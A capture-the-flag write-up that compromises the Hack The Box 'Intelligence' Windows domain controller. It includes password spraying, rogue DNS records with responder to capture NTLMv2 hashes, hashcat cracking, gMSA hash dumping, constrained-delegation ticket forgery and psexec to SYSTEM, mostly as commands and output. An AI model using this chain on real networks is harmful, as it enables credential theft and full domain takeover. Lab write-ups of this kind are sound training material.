## Default Information
IP Address: 10.10.10.248\
OS: Windows

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.248    intelligence.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.248 --rate=1000 -e tun0
[sudo] password for kali: 
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-03-03 09:18:59 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 49718/tcp on 10.10.10.248                                 
Discovered open port 49692/tcp on 10.10.10.248                                 
Discovered open port 49667/tcp on 10.10.10.248                                 
Discovered open port 53/udp on 10.10.10.248                                    
Discovered open port 3268/tcp on 10.10.10.248                                  
Discovered open port 49711/tcp on 10.10.10.248                                 
Discovered open port 80/tcp on 10.10.10.248                                    
Discovered open port 5985/tcp on 10.10.10.248                                  
Discovered open port 9389/tcp on 10.10.10.248                                  
Discovered open port 139/tcp on 10.10.10.248                                   
Discovered open port 49691/tcp on 10.10.10.248                                 
Discovered open port 636/tcp on 10.10.10.248                                   
Discovered open port 53/tcp on 10.10.10.248                                    
Discovered open port 88/tcp on 10.10.10.248                                    
Discovered open port 464/tcp on 10.10.10.248                                   
Discovered open port 135/tcp on 10.10.10.248                                   
Discovered open port 445/tcp on 10.10.10.248                                   
Discovered open port 3269/tcp on 10.10.10.248                                  
Discovered open port 593/tcp on 10.10.10.248                                   
Discovered open port 389/tcp on 10.10.10.248                                   
Discovered open port 62616/tcp on 10.10.10.248 
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 53  | domain | Simple DNS Plus | Open |
| 80  | http | Microsoft IIS httpd 10.0 | Open |
| 88  | kerberos-sec | Microsoft Windows Kerberos (server time: 2022-03-03 07:57:55Z) | Open |
| 135  | msrpc | Microsoft Windows RPC | Open |
| 139  | netbios-ssn | Microsoft Windows netbios-ssn | Open |
| 389  | ldap | Microsoft Windows Active Directory LDAP | Open |
| 445  | microsoft-ds | NIL | Open |
| 464  | kpassword5 | NIL | Open |
| 593  | ncacn_http | Microsoft Windows RPC over HTTP 1.0 | Open |
| 636  | ssl-ldap | Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | Open |
| 3268 | ldap | Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | Open |
| 3269  | ldap | Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | Open |
| 5985  | http | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | Open |
| 9389  | ms-mnf | .NET Message Framing | Open |
| 49667 | msrpc  | Microsoft Windows RPC | Open |
| 49691 | nacan_http | Microsoft Windows RPC over HTTP 1.0 | Open |
| 49692 | msrpc | Microsoft Windows RPC | Open |
| 49711 | msrpc | Microsoft Windows RPC | Open |
| 49718 | msrpc | Microsoft Windows RPC | Open |
| 62616 | msrpc | Microsoft Windows RPC | Open |

Looking at the nmap output, we are able to see some LDAP service that is running on some of the ports. We can conclude that we are looking at an active directory.

Looking at the output of port 389 from nmap, we are also able to find another domain ```dc.intelligence.htb```. We will add the domain to our /etc/host file. 

```
10.10.10.248    dc.intelligence.htb intelligence.htb
```

### SMB Enumeration

Let us first try to authenticate to the SMB client using null authentication. Unfortunately, we are unable to authenticate using null authentication.

```
┌──(kali㉿kali)-[~]
└─$ smbmap -u null -p "" -H 10.10.10.248 -P 445
[!] Authentication error on 10.10.10.248
                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ smbmap -u "" -p "" -H 10.10.10.248 -P 445
[+] IP: 10.10.10.248:445        Name: dc.intelligence.htb                               
                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ smbmap -u "" -p null -H 10.10.10.248 -P 445
[!] Authentication error on 10.10.10.248
                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ smbmap -u null -p null -H 10.10.10.248 -P 445
[!] Authentication error on 10.10.10.248
```

### Web Enumeration on port 80
Using gobuster, we are able to find a few endpoints. However, accessing http://intelligence.htb/documents returns us a 403 Forbidden status code. 

```
http://10.10.10.248:80/Index.html           (Status: 200) [Size: 7432]
http://10.10.10.248:80/documents            (Status: 301) [Size: 156] [--> http://10.10.10.248:80/documents/]
```
Visiting http://intelligence.htb, we are able to find another 2 endpoints http://intelligence.htb/documents/2020-01-01-upload.pdf and http://intelligence.htb/documents/2020-12-15-upload.pdf, where can download pdf files. We will then download the pdf files onto our local machine. 

Inspecting the contents of the pdf file, we realize that there is no interesting information in the pdf files. However, we also realize that we are able to obtain the creator of the pdf file using exiftool. This could potentially give us a list of possible usernames that could be used to authenticate to the active directory

```
┌──(kali㉿kali)-[~/Desktop/intelligence]
└─$ exiftool 2020-01-01-upload.pdf            
ExifTool Version Number         : 12.36
File Name                       : 2020-01-01-upload.pdf
Directory                       : .
File Size                       : 26 KiB
File Modification Date/Time     : 2022:03:03 04:46:16-05:00
File Access Date/Time           : 2022:03:03 04:46:42-05:00
File Inode Change Date/Time     : 2022:03:03 04:46:42-05:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee
```

### Extracting pdf files
Looking at the file name, we realize that it is of the format of <year>-<month>-<date>-upload.pdf. We will then create a script that can download all the pdf files and obtain the names of the file creator. 

```python3
import requests
import subprocess

year = 2020

def padNumber(number):
    if number < 10:
        return "0" + str(number)
    else:
        return str(number)

def downloadFiles():
    names_file = open("username.txt","a")
    for month in range(1,13):
        for day in range(1,32):
            url = "http://intelligence.htb/documents/{year}-{month}-{day}-upload.pdf".format(year=year,month=padNumber(month),day=padNumber(day))
            r = requests.get(url)
            if r.status_code == 200:
                fileName = "pdf/{year}-{month}-{day}-upload.pdf".format(year=year, month=padNumber(month), day=padNumber(day))
                print("[+] Downloading {fileName}".format(fileName=fileName))
                open(fileName,'wb').write(r.content)
                output = subprocess.check_output("exiftool {fileName} | grep Creator".format(fileName=fileName), shell=True)
                name = output.decode().replace("Creator                         : ","").strip()
                print("[!] Found username: {name}".format(name=name))
                names_file.write(name + "\n")
            else:
                continue

def main():
    downloadFiles()

if __name__ == '__main__':
    main()
```

## Exploit
### Obtaining credentials from pdf files

Looking through all the pdf files, we are able to find a pdf file named 2020-06-04-upload.pdf that exposes the default password
![Exposed password in pdf](https://github.com/joelczk/writeups/blob/main/HTB/Images/Intelligence/pdf_password.png)

Apart from that, we are also able to discover another pdf file 2020-12-30-upload.pdf that reveals another user Ted that is not in the list of usernames that we have obtained.
![New user in pdf](https://github.com/joelczk/writeups/blob/main/HTB/Images/Intelligence/user_pdf.png)

### Finding username for the default password

Next, we will use crackmapexec to go through the list of usernames that we have obtained earlier to find which user uses the default password that was discovered from the pdf file earlier.

From the output, we are able to know that the user Tiffany.Molina still uses the default password.

```
┌──(kali㉿kali)-[~/Desktop/intelligence]
└─$ crackmapexec smb 10.10.10.248 -u username.txt -p "NewIntelligenceCorpUser9876"
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
...
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
```
### Enumerating shares on Tiffany.Molina
Now that we have obtained the credentials for Tiffany.Molina, let us enumerate the shares on the smb server for Tiffany.Molina. From the output, we can see that the user has access to Users share and the IT share.

```
┌──(kali㉿kali)-[~/Desktop/intelligence]
└─$ smbmap -u Tiffany.Molina -p "NewIntelligenceCorpUser9876" -H 10.10.10.248
[+] IP: 10.10.10.248:445        Name: dc.intelligence.htb                               
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT                                                      READ ONLY
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
```

Next, we will use smbclient to connect to the Users share using smbclient.

```
┌──(kali㉿kali)-[~/Desktop/intelligence]
└─$ smbclient //10.10.10.248/Users -U Tiffany.Molina%NewIntelligenceCorpUser9876
Try "help" to get a list of possible commands.
smb: \>  
```
### Obtaining user flag

```
smb: \Tiffany.Molina\Desktop\> get user.txt
getting file \Tiffany.Molina\Desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)

┌──(kali㉿kali)-[~/Desktop/intelligence]
└─$ cat user.txt    
<Redacted user flag>

```

### Enumerating the IT share

Next, we will take a look at the IT share. From there, we can find a downdetector.ps1 file. We will download the file and examine it in greater detail. 

```
smb: \> get downdetector.ps1
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
```

### Exploiting downdetector.ps1
Looking at the source code of downdetector.ps1, we can know that this script runs at 5mins interval and will check every DNS record in intelligence.htb, where the object-name starts with ```web```. It will then try to send a web request to the DNS record to check if the server is up. If the server does not return a 200 OK status code, it will then trigger an email to Ted.Graves@intelligence.htb

```
┌──(kali㉿kali)-[~/Desktop/intelligence]
└─$ cat downdetector.ps1   
��# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

This can be exploited by adding in an invalid VHOST to the DNS zone, which will trigger an email alert to Ted.Graves@intelligence.htb. To do that, we will first need to use responder to posion the DNS records so that the network traffic will be redirected to our local machine and we will be able to obtain the NTLM hash of Ted.Graves user.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo responder -I tun0 -A                                        
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.7.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C
```

Next, what we have to is to add an invalid VHOST to the DNS zone so that we can trigger the downdetector.ps1 script to send an email to Ted.Graves@intelligence.htb. This will then allow responder to intercept the NTLM hash of Ted.Graves.

```
┌──(HTB)─(kali㉿kali)-[~/Desktop/krbrelayx]
└─$ python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -a add -r 'webtesting.intelligence.htb' -d 10.10.16.4 10.10.10.248
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

Afterwards, the NTLMv2 hash of Ted.Graves will be captured on responder.

```
[+] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.
[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:ed3a1b3d7da4bfff:1B9A20B51C6370289B030E962F045108:0101000000000000207694DBC32FD8017B88FAAA09523B2A00000000020008004B0043004A00440001001E00570049004E002D0034003600440043004E0034005A004D004E0049004400040014004B0043004A0044002E004C004F00430041004C0003003400570049004E002D0034003600440043004E0034005A004D004E00490044002E004B0043004A0044002E004C004F00430041004C00050014004B0043004A0044002E004C004F00430041004C000800300030000000000000000000000000200000401D0D198E88ED6F8538D44F11ED08AD199AD9DAA94545B597FEB125934861ED0A0010000000000000000000000000000000000009003A0048005400540050002F0077006500620074006500730074002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000  
```

### Cracking NTLMv2 hash
Now, we will proceed to use hashcat to crack the NTLM hash that we have obtained earlier. We are then able to crack the NTLMv2 hash as Mr.Teddy

```
┌──(kali㉿kali)-[~/Desktop]
└─$ hashcat -m 5600 hash.txt /home/kali/Desktop/pentest/wordlist/rockyou.txt --force                           255 ⨯
hashcat (v6.1.1) starting...
TED.GRAVES::intelligence:ed3a1b3d7da4bfff:1b9a20b51c6370289b030e962f045108:0101000000000000207694dbc32fd8017b88faaa09523b2a00000000020008004b0043004a00440001001e00570049004e002d0034003600440043004e0034005a004d004e0049004400040014004b0043004a0044002e004c004f00430041004c0003003400570049004e002d0034003600440043004e0034005a004d004e00490044002e004b0043004a0044002e004c004f00430041004c00050014004b0043004a0044002e004c004f00430041004c000800300030000000000000000000000000200000401d0d198e88ed6f8538d44f11ed08ad199ad9daa94545b597feb125934861ed0a0010000000000000000000000000000000000009003a0048005400540050002f0077006500620074006500730074002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy
```

### SMB Enumeration for Ted.Graves
We will first check the shares that are available to use using smbmap. However, we realize that the shares that is available to us is the same as when we authenticate using Tiffany.Molina

```
┌──(kali㉿kali)-[~/.hashcat]
└─$ smbmap -u Ted.Graves -p "Mr.Teddy" -H 10.10.10.248   
[+] IP: 10.10.10.248:445        Name: dc.intelligence.htb                               
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT                                                      READ ONLY
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
```

Afterwards, we will use smbclient to authenticate to the Users share. However, we realize that the root flag is not in the \Ted.Graves\Desktop directory.

```
smb: \Ted.Graves\Desktop\> dir
  .                                  DR        0  Sat Sep 15 03:12:33 2018
  ..                                 DR        0  Sat Sep 15 03:12:33 2018

                3770367 blocks of size 4096. 1462089 blocks available
```

### Enumerating LDAP Server using ldapsearch

Next, we will enumerate the LDAP server using ldapsearch to dump information regarding the LDAP server.

```
┌──(kali㉿kali)-[~]
└─$ ldapsearch -x -h 10.10.10.248 -D 'Ted.Graves@intelligence.htb' -w 'Mr.Teddy' -b 'dc=intelligence,dc=htb'    49 ⨯
# extended LDIF
#
# LDAPv3
# base <dc=intelligence,dc=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#
```

From the output of ldapsearch, we are able to find a Group Managed Service Account that is running on the domain.

```
# svc_int, Managed Service Accounts, intelligence.htb
dn: CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
objectClass: computer
objectClass: msDS-GroupManagedServiceAccount
cn: svc_int
distinguishedName: CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=h
 tb
instanceType: 4
whenCreated: 20210419004958.0Z
whenChanged: 20210614140522.0Z
uSNCreated: 12846
uSNChanged: 28709
name: svc_int
objectGUID:: eaCA8SbzskmEoTSCQgjWQg==
userAccountControl: 16781312
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
localPolicyFlags: 0
pwdLastSet: 132681531223540162
primaryGroupID: 515
objectSid:: AQUAAAAAAAUVAAAARobx+nQXDcpGY+TMeAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: svc_int$
sAMAccountType: 805306369
dNSHostName: svc_int.intelligence.htb
objectCategory: CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configurat
 ion,DC=intelligence,DC=htb
isCriticalSystemObject: FALSE
dSCorePropagationData: 16010101000000.0Z
msDS-AllowedToDelegateTo: WWW/dc.intelligence.htb
```

### Dumping MSA password hash of service account
We also noticted that for this Group Managed Service account, this managed service account was trusted for delegation to WWW. In other words, there is an constrained delegation for this managed service account for WWW.

```
msDS-AllowedToDelegateTo: WWW/dc.intelligence.htb
```

According to the link [here](https://adsecurity.org/?p=4367), since we have the credentials to Ted.Graves, we will also be able to dump the MSA password hash of this service account. 

![Obtaining hash of service account](https://github.com/joelczk/writeups/blob/main/HTB/Images/Intelligence/gsa_account_dump.png)

Now, we will download the tool for dumping the hash of the service account from [github](https://github.com/micahvandeusen/gMSADumper). Using the script, we are then able to dump the hash for svc_int.

However, with this GSA password hash, we are still unable to authenticate to the smb server using impacket's pass-the-hash attack as this is just a GSA password hash. We would need the NTLM password hash if we were to do the pass-the-hash attack.

```
┌──(HTB)─(kali㉿kali)-[~/Desktop/gMSADumper]
└─$ python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d intelligence.htb
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::09e5c4522742c318011036d6f73a0b86
```

### Privilege Escalation to Administrator

Since we have the GSA password hash, we can do a over-pass-the-hash attack on the Active Directory to achieve privilege escalation. However, before we do this we would need to sync our system clock with the server clock using ntpdate.

```
┌──(kali㉿kali)-[~/Desktop/intelligence]
└─$ sudo ntpdate 10.10.10.248
 5 Mar 05:34:28 ntpdate[1628]: step time server 10.10.10.248 offset +29227.503350 sec
```

Next, we will use impacket's getST module to generate a silver ticket that impersonate's the Adminstrator's account. 

```
┌──(kali㉿kali)-[~/Desktop/intelligence]
└─$ impacket-getST intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :09e5c4522742c318011036d6f73a0b86 -impersonate Administrator
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

Afterwards, we will have to load the Adminstrator's ticket that is stored in the cache by setting the KRB5CCNAME variable to the ticket path.
```
┌──(kali㉿kali)-[~/Desktop/intelligence]
└─$ export KRB5CCNAME=administrator.ccache
```

Lastly, we can use impacket's smbclient to authenticate to the SMB server without any credentials. 

```
┌──(kali㉿kali)-[~/Desktop/intelligence]
└─$ impacket-psexec -k intelligence.htb/Administrator@dc.intelligence.htb -no-pass
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on dc.intelligence.htb.....
[*] Found writable share ADMIN$
[*] Uploading file nHdcBpph.exe
[*] Opening SVCManager on dc.intelligence.htb.....
[*] Creating service PvlS on dc.intelligence.htb.....
[*] Starting service PvlS.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1879]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32>
```
### Obtaining root flag

```
C:\Users\Administrator\Desktop> type root.txt
<Redacted root flag>
```

## Post-Exploitation
### Finding Ted.Graves
Another way to find Ted.Graves user is through the use of rpcclient. Using rpcclient, we can run the enumdomusers to list all the users on the server.

```
┌──(kali㉿kali)-[~]
└─$ rpcclient -U'Tiffany.Molina%NewIntelligenceCorpUser9876' 10.10.10.248
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[Danny.Matthews] rid:[0x44f]
user:[Jose.Williams] rid:[0x450]
user:[Jason.Wright] rid:[0x451]
user:[Samuel.Richardson] rid:[0x452]
user:[David.Mcbride] rid:[0x453]
user:[Scott.Scott] rid:[0x454]
user:[David.Reed] rid:[0x455]
user:[Ian.Duncan] rid:[0x456]
user:[Michelle.Kent] rid:[0x457]
user:[Jennifer.Thomas] rid:[0x458]
user:[Kaitlyn.Zimmerman] rid:[0x459]
user:[Travis.Evans] rid:[0x45a]
user:[Kelly.Long] rid:[0x45b]
user:[Nicole.Brock] rid:[0x45c]
user:[Stephanie.Young] rid:[0x45d]
user:[John.Coleman] rid:[0x45e]
user:[Thomas.Valenzuela] rid:[0x45f]
user:[Thomas.Hall] rid:[0x460]
user:[Brian.Baker] rid:[0x461]
user:[Richard.Williams] rid:[0x462]
user:[Teresa.Williamson] rid:[0x463]
user:[David.Wilson] rid:[0x464]
user:[Darryl.Harris] rid:[0x465]
user:[William.Lee] rid:[0x466]
user:[Thomas.Wise] rid:[0x467]
user:[Veronica.Patel] rid:[0x468]
user:[Joel.Crawford] rid:[0x469]
user:[Jean.Walter] rid:[0x46a]
user:[Anita.Roberts] rid:[0x46b]
user:[Brian.Morris] rid:[0x46c]
user:[Daniel.Shelton] rid:[0x46d]
user:[Jessica.Moody] rid:[0x46e]
user:[Tiffany.Molina] rid:[0x46f]
user:[James.Curbow] rid:[0x470]
user:[Jeremy.Mora] rid:[0x471]
user:[Jason.Patterson] rid:[0x472]
user:[Laura.Lee] rid:[0x473]
user:[Ted.Graves] rid:[0x474]
rpcclient $>
```
